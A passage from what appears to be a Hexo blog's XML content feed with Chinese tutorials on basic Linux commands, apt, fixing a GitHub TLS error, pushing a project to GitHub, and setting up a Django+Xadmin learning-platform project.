打包文件.tar.bz2</span><br></pre></td></tr></table></figure><h2 id="04-软件安装"><a href="#04-软件安装" class="headerlink" title="04. 软件安装"></a>04. 软件安装</h2><h2 id="4-1-通过-apt-安装／卸载软件"><a href="#4-1-通过-apt-安装／卸载软件" class="headerlink" title="4.1 通过 apt 安装／卸载软件"></a>4.1 通过 apt 安装／卸载软件</h2><ul><li>apt 是 <code>Advanced Packaging Tool</code>，是 Linux 下的一款安装包管理工具</li><li>可以在终端中方便的 <strong>安装</strong>／<strong>卸载</strong>／<strong>更新软件包</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 安装软件</span></span><br><span class="line">$ sudo apt install 软件包</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 卸载软件</span></span><br><span class="line">$ sudo apt remove 软件名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 更新已安装的包</span></span><br><span class="line">$ sudo apt upgrade </span><br></pre></td></tr></table></figure><h3 id="安装演练"><a href="#安装演练" class="headerlink" title="安装演练"></a>安装演练</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一个小火车提示</span></span><br><span class="line">$ sudo apt install sl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个比较漂亮的查看当前进程排名的软件</span></span><br><span class="line">$ sudo apt install htop</span><br></pre></td></tr></table></figure><h2 id="4-2-配置软件源"><a href="#4-2-配置软件源" class="headerlink" title="4.2 配置软件源"></a>4.2 配置软件源</h2><ul><li>如果希望在 <code>ubuntu</code> 中安装软件，<strong>更加快速</strong>，可以通过设置<strong>镜像源</strong>，选择一个访问网速更快的服务器，来提供软件下载／安装服务</li><li>提示：更换服务器之后，需要一个相对比较长时间的更新过程，需要耐心等待。更新完成后，再安装软件都会从新设置的服务器下载软件了</li></ul><blockquote><p>所谓镜像源，就是<strong>所有服务器的内容是相同的（镜像）</strong>，但是根据所在位置不同，国内服务器通常速度会更快一些！</p></blockquote><center><p><img src="/2018/05/10/Linux%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4/003_%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><center><p><img src="/2018/05/10/Linux%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4/001_ubuntu%E8%AE%BE%E7%BD%AE%E8%BD%AF%E4%BB%B6%E6%BA%90.png"></p></center>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux其他命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令的基本使用</title>
      <link href="/2018/05/10/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/05/10/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="常用-Linux-命令的基本使用"><a href="#常用-Linux-命令的基本使用" class="headerlink" title="常用 Linux 命令的基本使用"></a>常用 Linux 命令的基本使用</h1><a id="more"></a><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>理解学习 Linux 终端命令的原因</li><li>常用 Linux 命令体验</li></ul><h2 id="01-学习-Linux-终端命令的原因"><a href="#01-学习-Linux-终端命令的原因" class="headerlink" title="01. 学习 Linux 终端命令的原因"></a>01. 学习 Linux 终端命令的原因</h2><ul><li>Linux 刚面世时并没有图形界面，所有的操作全靠命令完成，如 <strong>磁盘操作</strong>、<strong>文件存取</strong>、<strong>目录操作</strong>、<strong>进程管理</strong>、<strong>文件权限</strong> 设定等</li><li>在职场中，大量的 <strong>服务器维护工作</strong> 都是在 <strong>远程</strong> 通过 <strong>SSH 客户端</strong> 来完成的，并没有图形界面，所有的维护工作都需要通过命令来完成</li><li>在职场中，作为后端程序员，必须要或多或少的掌握一些 Linux 常用的终端命令</li><li>Linux 发行版本的命令大概有 200 多个，但是常用的命令只有 10 多个而已</li></ul><blockquote><p>学习终端命令的技巧：</p><ul><li>不需要死记硬背，对于常用命令，用的多了，自然就记住了</li><li>不要尝试一次学会所有的命令，有些命令是非常不常用的，临时遇到，临时百度就可以</li></ul></blockquote><h2 id="02-常用-Linux-命令的基本使用"><a href="#02-常用-Linux-命令的基本使用" class="headerlink" title="02. 常用 Linux 命令的基本使用"></a>02. 常用 Linux 命令的基本使用</h2><table><thead><tr><th>序号</th><th>命令</th><th>对应英文</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>ls</td><td>list</td><td>查看当前文件夹下的内容</td></tr><tr><td>02</td><td>pwd</td><td>print work directory</td><td>查看当前所在文件夹</td></tr><tr><td>03</td><td>cd [目录名]</td><td>change directory</td><td>切换文件夹</td></tr><tr><td>04</td><td>touch [文件名]</td><td>touch</td><td>如果文件不存在，新建文件</td></tr><tr><td>05</td><td>mkdir [目录名]</td><td>make directory</td><td>创建目录</td></tr><tr><td>06</td><td>rm [文件名]</td><td>remove</td><td>删除指定的文件名</td></tr><tr><td>07</td><td>clear</td><td>clear</td><td>清屏</td></tr></tbody></table><blockquote><p>小技巧</p><ul><li><code>ctrl + shift + = </code> <strong>放大</strong>终端窗口的字体显示</li><li><code>ctrl + - </code> <strong>缩小</strong>终端窗口的字体显示</li></ul></blockquote><h3 id="03-自动补全"><a href="#03-自动补全" class="headerlink" title="03. 自动补全"></a>03. 自动补全</h3><ul><li>在敲出 <code>文件</code>／<code>目录</code>／<code>命令</code> 的前几个字母之后，按下 <code>tab</code> 键<ul><li>如果输入的没有歧义，系统会自动补全</li><li>如果还存在其他 <code>文件</code>／<code>目录</code>／<code>命令</code>，再按一下 <code>tab</code> 键，系统会提示可能存在的命令</li></ul></li></ul><blockquote><p>小技巧</p><ul><li>按 <code>上</code>／<code>下</code> 光标键可以在曾经使用过的命令之间来回切换</li><li>如果想要退出选择，并且不想执行当前选中的命令，可以按 <code>ctrl + c</code></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux终端命令格式</title>
      <link href="/2018/05/10/Linux%E7%BB%88%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F/"/>
      <url>/2018/05/10/Linux%E7%BB%88%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-终端命令格式"><a href="#Linux-终端命令格式" class="headerlink" title="Linux 终端命令格式"></a>Linux 终端命令格式</h1><a id="more"></a><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>了解终端命令格式</li><li>知道如何查阅终端命令帮助信息</li></ul><h2 id="01-终端命令格式"><a href="#01-终端命令格式" class="headerlink" title="01. 终端命令格式"></a>01. 终端命令格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure><p>说明：</p><p>1.<code>command</code>：命令名，相应功能的英文单词或单词的缩写</p><p>2.<code>[-options]</code>：选项，可用来对命令进行控制，也可以省略</p><p>3.<code>parameter</code>：传给命令的参数，可以是 <strong>零个</strong>、<strong>一个</strong> 或者 <strong>多个</strong></p><blockquote><p><code>[]</code> 代表可选 </p></blockquote><h2 id="02-查阅命令帮助信息（知道）"><a href="#02-查阅命令帮助信息（知道）" class="headerlink" title="02. 查阅命令帮助信息（知道）"></a>02. 查阅命令帮助信息（知道）</h2><blockquote><p>提示</p><p>现阶段只需要 <strong>知道</strong> 通过以下两种方式可以查询命令的帮助信息</p><p>先学习<strong>常用命令</strong>及<strong>常用选项</strong>的使用即可，工作中如果遇到问题可以借助 <strong>网络搜索</strong></p></blockquote><h3 id="2-1-help"><a href="#2-1-help" class="headerlink" title="2.1 --help"></a>2.1 <code>--help</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>说明：</p><p>显示 <code>command</code> 命令的帮助信息</p><h3 id="2-2-man"><a href="#2-2-man" class="headerlink" title="2.2 man"></a>2.2 man</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p>说明：</p><p>查阅 <code>command</code> 命令的使用手册</p><blockquote><p><code>man</code> 是 <strong>manual</strong> 的缩写，是 Linux 提供的一个 <strong>手册</strong>，包含了绝大部分的命令、函数的详细使用说明</p></blockquote><p>使用 <code>man</code> 时的操作键：</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>/word</td><td>搜索 <strong>word</strong> 字符串</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 终端命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github弃用TLS1.0/1.1出现后上传项目出错</title>
      <link href="/2018/05/10/Github%E5%BC%83%E7%94%A8TLS1-0-1-1%E5%87%BA%E7%8E%B0%E5%90%8E%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE%E5%87%BA%E9%94%99/"/>
      <url>/2018/05/10/Github%E5%BC%83%E7%94%A8TLS1-0-1-1%E5%87%BA%E7%8E%B0%E5%90%8E%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE%E5%87%BA%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h1 id="SSL-routines-SSL23-GET-SERVER-HELLO-tlsv1-alert-protoclol-version"><a href="#SSL-routines-SSL23-GET-SERVER-HELLO-tlsv1-alert-protoclol-version" class="headerlink" title="SSL routines: SSL23_GET_SERVER_HELLO:tlsv1 alert protoclol version"></a>SSL routines: SSL23_GET_SERVER_HELLO:tlsv1 alert protoclol version</h1><a id="more"></a><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p>用git push到github的时候出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO: tlsv1 alert protocol version</span><br></pre></td></tr></table></figure><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>在 2018年2月22日19:00 UTC（太平洋标准时间上午11:00），GitHub 停止了对加密弱 TLS 1.0 和 1.1 协议的支持，并且仅支持与 TLS 1.2 协议的连接。</p><p>官方声明：</p><p><a href="https://githubengineering.com/crypto-removal-notice/">Github . Weak cryptographic standards removal notice</a></p><p>因此，如果你的 git 连接方式仍然是 TLS 1.0 或 1.1，则会报错。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>①  查看你的 TLS 版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --list1</span><br></pre></td></tr></table></figure><p>②  如果仍然是 TLS 1.0 或 1.1，则下载更新 Git 最新版：<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>③  安装好最新版 Git 后，更新 TLS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.sslVersion</span><br><span class="line">git config --global --add http.sslVersion tlsv1.212</span><br></pre></td></tr></table></figure><p>④  现在则可以使用 TLS 1.2 传输，并解决此问题</p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 错误 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地项目上传到Github</title>
      <link href="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/"/>
      <url>/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/</url>
      
        <content type="html"><![CDATA[<p>将本地的开发项目部署到github中进行托管是非常方便的，今天就总结一下部署的方法。</p><a id="more"></a><h1 id="Https方法部署"><a href="#Https方法部署" class="headerlink" title="Https方法部署"></a>Https方法部署</h1><p><strong>==第一步==</strong></p><p>登录到github网站，然后点击Your profile，进行仓库管理</p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/1.png"></p><p><strong>==第二步==</strong></p><p>新建仓库，给仓库创建一个名称</p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/2.png"></p><p>仓库创建成功</p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/3.png"></p><p>上图已经写清楚了Github上传项目的方法，有<strong>两种方法</strong>：一种通过<code>https</code>，一种通过<code>ssh</code>。 </p><p> <strong>==第三步==</strong></p><p>第因为GitHub是基于git实现的代码托管，所以git是少不了的。我们要确认电脑上安装了git，没有安装的，就去安装git。至于安装方法，就自行百度吧。 </p><p> <strong>==第四步==</strong></p><p>新建你要部署项目的名称文件夹，比如我仓库名称为StudyOnline，于是我文件夹名称就是StudyOnline，里面添加你项目的文件。当然你也可以直接将项目拷贝到一个地方作为本地仓库，右击Test文件夹根目录，点击<code>Git Bash Here</code>，打开git命令行。 </p><p><strong>==第五步==</strong></p><p>1.按照github新建仓库上的文档提示，提交项目： </p><p>在命令行中，输入<code>git init</code>，使StudyOnline文件夹加入git管理； </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>这时候文件夹里面多路一个<code>.git</code>文件夹，它是Git用来跟踪和管理版本库的。如果你看不到，是因为它默认是隐藏文件，那你就需要设置一下让隐藏文件可见。 </p><p>2.当项目黏贴到本地Git仓库里面，你可以用<code>git status</code>来查看你当前的状态，然后输入<code>git add .</code>（不要漏了“.”,而且与add之间有一个空格），将StudyOnline文件夹全部内容添加到git。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/5.png"></p><p>3..输入<code>git commit -m first commit</code>（“git commit -m “提交信息”” ） </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m first commit</span><br></pre></td></tr></table></figure><p>4.输入<code>git remote add origin https://github.com/wlk-flyme/StudyOnline.git  </code>(git remote add origin 你自己的https地址），连接你的guthub仓库。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https:&#x2F;&#x2F;github.com&#x2F;wlk-flyme&#x2F;StudyOnline.git</span><br></pre></td></tr></table></figure><p>4.输入<code>git push -u origin master</code>，上传项目到Github。这里会要求输入Github的账号密码，按要求输入就可以。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p> 由于新建的远程仓库是空的，所以要加上-u这个参数，等远程仓库里面有了内容之后，下次再从本地库上传内容的时候只需下面这样就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure><p>提交项目成功如图所示：</p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/9.png"></p><p>这时候你再重新刷新你的Github页面进入刚才新建的那个仓库里面就会发现项目已经成功上传了： </p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/4.png"></p><h1 id="SSH部署方法"><a href="#SSH部署方法" class="headerlink" title="SSH部署方法"></a>SSH部署方法</h1><h2 id="创建SSH-KEY"><a href="#创建SSH-KEY" class="headerlink" title="创建SSH KEY"></a>创建SSH KEY</h2><p>创建SSH KEY。先看一下你C盘用户目录下有没有.ssh目录，有的话看下里面有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，有就跳到下一步，没有就通过下面命令创建 .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/7.png"></p><p>   然后一路回车。这时你就会在用户下的.ssh目录里找到id_rsa和id_rsa.pub这两个文件    </p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/6.png"></p><h2 id="填写SSH-KEY"><a href="#填写SSH-KEY" class="headerlink" title="填写SSH KEY"></a>填写SSH KEY</h2><p>登录Github,找到右上角的图标，打开点进里面的<code>Settings</code>，再选中里面的<code>SSH and GPG KEYS</code>，点击右上角的<code>New SSH  key</code>，然后<code>Title</code>里面随便填，再把刚才<code>id_rsa.pub</code>里面的内容复制到Title下面的Key内容框里面，最后点击<code>Add SSH  key</code>，这样就完成了SSH Key的加密。 </p><p><img src="/2018/05/09/%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0%E5%88%B0Github/8.png"></p><p>剩下的步骤基本差不多</p><p><strong>==注意==</strong></p><p>另外，这里有个<strong>坑</strong>需要注意一下，就是在上面第七步创建远程仓库的时候，如果你勾选了<code>Initialize this repository with a  README</code>（就是创建仓库的时候自动给你创建一个README文件），那么到了第九步你将本地仓库内容推送到远程仓库的时候就会报一个failed to push some refs to  <a href="https://github.com/guyibang/TEST2.git%E7%9A%84%E9%94%99%E3%80%82">https://github.com/guyibang/TEST2.git的错。</a> </p><p>这是由于你新创建的那个仓库里面的README文件不在本地仓库目录中，这时我们可以通过以下命令先将内容合并以下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>这个时候再push就成功了</p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 本地上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django+Xadmin开发在线学习平台</title>
      <link href="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/"/>
      <url>/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="项目演示及介绍"><a href="#项目演示及介绍" class="headerlink" title="项目演示及介绍"></a><center>项目演示及介绍</center></h1><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/1570013953137.png" alt="1570013953137"></p><a id="more"></a><blockquote><p>项目实战：Django+xadmin搭建在线学习平台</p><br><p>系统演示地址：<a href="http://www.poket.top/">www.poket.top</a>  (不过最近访问不了，因为还在备案中)</p><br><p>GitHub代码仓库: </p><p><a href="https://github.com/wlk-flyme/StudyOnline">https://github.com/wlk-flyme/StudyOnline</a></p></blockquote><br><h2 id="系统总体介绍"><a href="#系统总体介绍" class="headerlink" title="系统总体介绍"></a><strong>系统总体介绍</strong></h2><br><ol><li><p>系统具有完整的用户登录、注册、修改密码、找回密码、重新绑定注册邮箱等功能，拥有完整的个人中心。</p></li><li><p>导航栏：<code>公开课</code>、<code>授课老师</code>、<code>授课机构</code>、<code>全局搜索</code> 。</p></li><li><p>个人中心：<code>修改头像</code>、<code>修改密码</code>、<code>修改邮箱</code>，查看我收藏的课程、授课老师、授课机构，这些收藏还可以删除，以及我学习过的课程记录。</p></li><li><p>点击<code>公开课</code>-&gt;课程列表，可以根据<code>最新</code>、<code>最热门</code>与<code>参与人数</code>来进行排序-搜索；<code>热门课程推荐</code>，课程的分页。</p></li><li><p>点击<code>课程</code>-&gt;课程详情页（公开课的基本信息），对课程进行收藏，取消收藏，富文本展示课程内容。</p></li><li><p>点击<code>开始学习</code>-&gt;公开课的<code>章节信息</code>、<code>评论信息</code>以及<code>课程资源的下载</code>。</p></li><li><p>点击<code>授课教师</code>-&gt;教师列表，可以根据人气进行讲师排名展示以及分页，页面右侧栏有讲师排行榜。</p></li><li><p>点击<code>讲师的详情页面</code>–&gt; 对讲师进行收藏和分享，以及讲师的全部课程。 </p></li><li><p>点击<code>授课机构</code>-&gt;进入授课机构首页，top栏有<code>机构类别和</code>与<code>所在地区</code>，可以进行筛选，页面右侧栏有<code>我要学习</code>表单和<code>机构排行榜</code>，中间容器展示机构，并且可以根据<code>学习人数</code>与<code>课程数</code>来进行排序。</p></li><li><p>点击<code>机构</code>–&gt; 左侧：<code>机构首页</code>,<code>机构课程</code>，<code>机构介绍</code>，<code>机构讲师</code> 四个小功能模块。</p></li><li><p>后台管理系统可以自由切换<code>主题</code>,左侧栏每一个模块都有列表显示, 增删改查，筛选功能。 </p></li><li><p>课程列表页可以对不同字段进行排序，选择多条记录进行删除操作。</p></li><li><p>课程新增页面上传图片，富文本的编辑。时间选择，添加章节，添加课程资源。 </p></li><li><p>日志记录：记录后台人员的操作 </p><br><h2 id="开发环境搭建任务"><a href="#开发环境搭建任务" class="headerlink" title="开发环境搭建任务"></a>开发环境搭建任务</h2><p>windows下通过<code>pycharm</code>和<code>virtualenv</code>搭建开发环境</p> <br><h2 id="数据库设计和xadmin搭建后台管理系统任务"><a href="#数据库设计和xadmin搭建后台管理系统任务" class="headerlink" title="数据库设计和xadmin搭建后台管理系统任务"></a>数据库设计和xadmin搭建后台管理系统任务</h2></li></ol><p>通过业务分析设计<code>django</code>的每个<code>app</code>，设计<code>app</code>下的<code>model</code>。设计<code>外键关系</code>，通过django的<code>migrate</code>设计生成数据表。</p><p>然后将这些<code>model</code>注册到<code>xadmin</code>当中。为每个model配置<code>搜索</code>,<code>过滤字段</code>，以及<code>列表页的显示字段</code>。配置xadmin的<code>主题选择</code>功能。</p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E5%90%8E%E5%8F%B0%E8%AE%BE%E8%AE%A1.png"></p><h2 id="系统功能模块实现任务"><a href="#系统功能模块实现任务" class="headerlink" title="系统功能模块实现任务"></a>系统功能模块实现任务</h2><p><strong>实现所有后台功能 &amp; 面试中经常被提及的web开发知识。</strong></p><p><strong>几乎所有的Django常用的模块：</strong></p><ol><li><code>setting</code>配置</li><li><code>url</code>配置</li><li><code>view</code>书写</li><li><code>model</code>设计</li><li><code>form</code>和<code>modelform</code>的使用</li><li><code>templates</code>模板的使用</li><li><code>Django</code>常见的内置函数</li></ol><br><h2 id="web系统知识以及网络安全任务"><a href="#web系统知识以及网络安全任务" class="headerlink" title="web系统知识以及网络安全任务"></a>web系统知识以及网络安全任务</h2><ol><li><code>sql</code>注入</li><li><code>xss</code>攻击</li><li><code>crsf</code>攻击</li></ol><p>这些攻击的原理以及防护措施</p><br><h2 id="xadmin扩展知识"><a href="#xadmin扩展知识" class="headerlink" title="xadmin扩展知识"></a>xadmin扩展知识</h2><p><strong>掌握更多可定制功能:</strong></p><ol><li>权限管理</li><li>权限配置</li><li>权限、用户、组之间的关系</li><li>xadmin常用插件</li><li>如何自定义xadmin插件</li><li>xadmin的富文本编辑功能</li><li>xadmin的excel导入功能</li></ol><p>还会用到一些开源的django开发库。</p><center><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/2.png"></p></center><p>学习完django，对于我们学习其他框架和通过Django搭建自己的系统都将变成简单的事情。</p><br><blockquote><p>Django+Xadmin开发现在学习平台</p><br><p>&nbsp;&nbsp;&nbsp;第二章：windows下搭建开发环境</p><p>&nbsp;&nbsp;&nbsp;&nbsp;教你安装mysql、pycharm、navicat、python相关环境</p></blockquote><p>​                       </p><br><h1 id="windows下搭建开发环境"><a href="#windows下搭建开发环境" class="headerlink" title="windows下搭建开发环境"></a><center>windows下搭建开发环境</center></h1><h2 id="Pycharm、mysql、Navicat安装"><a href="#Pycharm、mysql、Navicat安装" class="headerlink" title="Pycharm、mysql、Navicat安装"></a>Pycharm、mysql、Navicat安装</h2><p><strong>环境搭建</strong></p><blockquote><ol><li>pycharm</li><li>mysql for windows</li><li>navicat for mysql</li><li>python3.4</li></ol></blockquote><p><strong>提醒：记住自己设置的mysql密码</strong></p><br><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>去mysql官网去下载相关的<a href="https://dev.mysql.com/downloads/installer/">mysql</a>，笔者自己下载的是mysql 的MSI版的，安装过程可以参考<a href="https://jingyan.baidu.com/article/f3ad7d0ffc061a09c3345bf0.html">https://jingyan.baidu.com/article/f3ad7d0ffc061a09c3345bf0.html</a></p><p>（本人就是按照这个来安装的）。</p><p>安装结束后，可以通过下面命令登录到mysql。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p </span><br></pre></td></tr></table></figure><p>然后输入登录密码就可以登录到mysql 了。</p><br><h3 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h3><p>安装指南：下一步-&gt;下一步</p><p>下载地址：<a href="http://www.navicat.com.cn/download/navicat-for-mysql">http://www.navicat.com.cn/download/navicat-for-mysql</a></p><br><p>Pycharm</p><p>pycharm官方下载链接：<a href="https://www.jetbrains.com/pycharm/download/#section=windows">https://www.jetbrains.com/pycharm/download/#section=windows</a></p><p><strong>我们要选择专业版（Professional）</strong>因为只有专业版才能够新建django项目,免费社区版不能。 （至于专业版的注册码可以上网去寻找解决办法，资源很多，无需担心）</p><p><strong>为Pycharm添加解释器：</strong> </p><p><code>setting</code> - &gt;<code>Project Interpreter</code>： 可以添加虚拟环境中的python解释器，也可以是自己本地安装好的python解释器，一直定位到 <code>python.exe</code> 点击确认。 </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/3.png"></p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/4.png"></p><br><h3 id="Python3-4的安装"><a href="#Python3-4的安装" class="headerlink" title="Python3.4的安装"></a>Python3.4的安装</h3><p>具体的安装过程参考<a href="http://www.jb51.net/article/65133.html%E3%80%82">http://www.jb51.net/article/65133.html。</a></p><br><h2 id="virutalenv安装和配置"><a href="#virutalenv安装和配置" class="headerlink" title="virutalenv安装和配置"></a>virutalenv安装和配置</h2><p>具体的参考<a href="http://wuliekun.me/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/">http://wuliekun.me/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</a></p><br><h2 id="Pycharm和Navicat的简单使用"><a href="#Pycharm和Navicat的简单使用" class="headerlink" title="Pycharm和Navicat的简单使用"></a>Pycharm和Navicat的简单使用</h2><h3 id="pycharm简单使用："><a href="#pycharm简单使用：" class="headerlink" title="pycharm简单使用："></a>pycharm简单使用：</h3><p><code>Setting -&gt; reopen</code>取消默认打开上一次项目 </p><br><h4 id="新建项目并验证成功运行"><a href="#新建项目并验证成功运行" class="headerlink" title="新建项目并验证成功运行"></a>新建项目并验证成功运行</h4><li>如何新建django项目： </li><p><img 